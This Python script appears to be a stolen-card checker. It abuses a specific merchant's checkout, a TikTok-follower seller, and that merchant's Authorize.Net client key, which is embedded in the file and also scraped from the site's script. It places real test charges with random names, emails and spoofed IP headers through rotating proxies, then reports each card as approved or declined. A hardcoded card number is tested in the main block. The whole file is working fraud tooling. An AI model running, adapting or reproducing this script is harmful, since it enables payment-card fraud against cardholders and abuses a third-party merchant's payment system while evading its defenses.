import os
import re
import json
import uuid
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
import requests

PROXIES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data", "proxies.txt")

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        try:
            with open(PROXIES_FILE, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
        except Exception:
            pass
    return []

def get_next_proxy():
    plist = load_proxies()
    if plist:
        return random.choice(plist)
    return None

def get_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def get_random_email():
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    return f"{get_random_string(8)}{random.randint(100, 999)}@{random.choice(domains)}"

def get_random_name():
    first_names = ["John", "Michael", "David", "James", "Robert", "Alex", "Daniel"]
    last_names = ["Smith", "Johnson", "Brown", "Taylor", "Miller", "Wilson", "Lee"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def get_random_ip():
    return f"{random.randint(50, 200)}.{random.randint(1, 250)}.{random.randint(1, 250)}.{random.randint(1, 250)}"

PRODUCT_RE = re.compile(r'const\s+product\s*=\s*({.*?});', re.DOTALL)
SETTINGS_RE = re.compile(r'const\s+settings\s*=\s*({.*?});', re.DOTALL)
LOGIN_RE = re.compile(r'_acceptApiLoginID\s*=\s*[\'"]([^\'"]+)[\'"]')
KEY_RE = re.compile(r'_acceptClientKey\s*=\s*[\'"]([^\'"]+)[\'"]')

def query_authorize_charge(cn: str, em: str, ey: str, cv: str) -> str:
    try:
        cn = re.sub(r'\D', '', str(cn))
        em = str(em).zfill(2)
        ey = str(ey)
        if len(ey) == 2:
            ey = "20" + ey
        elif len(ey) != 4:
            ey = "2029"
        exp_date = f"{em}{ey}"
        cv = str(cv).strip()
        holder_name = get_random_name()

        client_ip = get_random_ip()
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
            'X-Forwarded-For': client_ip,
            'Client-IP': client_ip
        })
        proxy = get_next_proxy()
        if proxy:
            session.proxies.update({"http": proxy, "https": proxy})

        order_url = "https://pay.promotid.com/order/?id=800&currency=USD"

        def fetch_order():
            return session.get(order_url, timeout=12)

        def fetch_js():
            return requests.get("https://pay.promotid.com/assets/checkout/script.js?v=4", timeout=12)

        def fetch_auth_token(name, key):
            auth_url = "https://api2.authorize.net/xml/v1/request.api"
            payload = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {"name": name, "clientKey": key},
                    "data": {
                        "type": "TOKEN",
                        "id": str(uuid.uuid4()),
                        "token": {
                            "cardNumber": cn,
                            "expirationDate": exp_date,
                            "cardCode": cv,
                            "fullName": holder_name
                        }
                    }
                }
            }
            headers = {
                'Content-Type': 'application/json; charset=UTF-8',
                'Origin': 'https://pay.promotid.com',
                'Referer': 'https://pay.promotid.com/'
            }
            resp = requests.post(auth_url, json=payload, headers=headers, timeout=12)
            return json.loads(resp.text.lstrip('\ufeff'))

        with ThreadPoolExecutor(max_workers=3) as executor:
            f_order = executor.submit(fetch_order)
            f_js = executor.submit(fetch_js)
            f_auth = executor.submit(fetch_auth_token, "8uEs64Qx", "82XtSLh3y2U5mH6jVa3SjZ4dzC6ZgWbe4TuYvQVwkYW34Y6z6YEBffhk6BEdAtLX")

            r_order = f_order.result()
            r_js = f_js.result()
            token_response = f_auth.result()

        html = r_order.text
        js_content = r_js.text

        product_m = PRODUCT_RE.search(html)
        settings_m = SETTINGS_RE.search(html)
        product_data = json.loads(product_m.group(1)) if product_m else {}
        settings_data = json.loads(settings_m.group(1)) if settings_m else {}

        login_m = LOGIN_RE.search(js_content)
        key_m = KEY_RE.search(js_content)
        cur_name = login_m.group(1) if login_m else "8uEs64Qx"
        cur_key = key_m.group(1) if key_m else "82XtSLh3y2U5mH6jVa3SjZ4dzC6ZgWbe4TuYvQVwkYW34Y6z6YEBffhk6BEdAtLX"

        if cur_name != "8uEs64Qx" or cur_key != "82XtSLh3y2U5mH6jVa3SjZ4dzC6ZgWbe4TuYvQVwkYW34Y6z6YEBffhk6BEdAtLX":
            token_response = fetch_auth_token(cur_name, cur_key)

                                                          
        messages = token_response.get("messages", {})
        if messages.get("resultCode") == "Error":
            err_list = messages.get("message", [])
            err_text = err_list[0].get("text") if err_list else "Authorize.Net Token Error"
            return f"Declined! - {err_text}"

        opaque_data = token_response.get("opaqueData", {})
        data_descriptor = opaque_data.get("dataDescriptor", "")
        data_value = opaque_data.get("dataValue", "")

        if not data_value:
            return "Declined! - Token Generation Failed"

        price = product_data.get("price", "8.99")
        try:
            amt = float(price)
        except (ValueError, TypeError):
            amt = 8.99

        service_data = {
            "serviceType": product_data.get("serviceType", "TikTokFollowers"),
            "keyword": f"user{get_random_string(6)}",
            "email": get_random_email(),
            "qty": product_data.get("qty", 250),
            "price": str(price),
            "currency": product_data.get("currency", "$"),
            "productTitle": product_data.get("productTitle", "TikTok Followers"),
            "companyLogo": product_data.get("companyLogo", ""),
            "companyUrl": product_data.get("companyUrl", ""),
            "mainSiteOrigin": product_data.get("mainSiteOrigin", "promotid.com"),
            "siteAlias": product_data.get("siteAlias", "promotid"),
            "fpVisitorId": "",
            "fpRequestId": "",
            "isActiveFollowers": settings_data.get("isActiveFollowers", False),
            "id": str(product_data.get("pid", "800")),
            "amt": amt,
            "paymentMethod": "stripe",
            "currencyName": product_data.get("currencyNameRl", "USD"),
            "target": [],
            "promo": "No Promo"
        }

        checkout_payload = {
            'service': json.dumps(service_data),
            'paypal': json.dumps({"dataDescriptor": data_descriptor, "dataValue": data_value}),
            'method': "authorizenet"
        }

        checkout_headers = {
            'Origin': 'https://pay.promotid.com',
            'Referer': order_url,
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json, text/javascript, */*; q=0.01'
        }

        r_final = session.post("https://pay.promotid.com/checkout/action", data=checkout_payload, headers=checkout_headers, timeout=15)
        raw_resp = r_final.text.strip()

        try:
            res_json = json.loads(raw_resp)
        except Exception:
            if "declined" in raw_resp.lower():
                return "Declined! - Transaction declined"
            return f"Declined! - {raw_resp[:60]}"

        status = res_json.get("status")
        msg = res_json.get("msg") or res_json.get("message") or ""

        if status == "success" or "success" in msg.lower() or "thank" in msg.lower() or "completed" in msg.lower():
            return f"Approved! - {amt:.2f} USD Charged!"
        elif status == "blocked_feedback":
            return "Declined! - Security Verification Triggered"
        elif "too many payment attempts" in msg.lower():
            return "Declined! - Rate Limit (Please retry in a moment)"
        else:
            declined_msg = msg if msg else "Declined"
            return f"Declined! - {declined_msg}"

    except requests.exceptions.Timeout:
        return "⚠️ Site Hatası (Zaman Aşımı)"
    except requests.exceptions.ProxyError:
        return "⚠️ Proxy Hatası"
    except Exception as exc:
        return f"⚠️ Hata: {str(exc)[:60]}"

if __name__ == "__main__":
    t0 = time.time()
    res = query_authorize_charge("4744770184475987", "04", "2029", "104")
    print(f"Result: {res} ({round(time.time() - t0, 2)}s)")
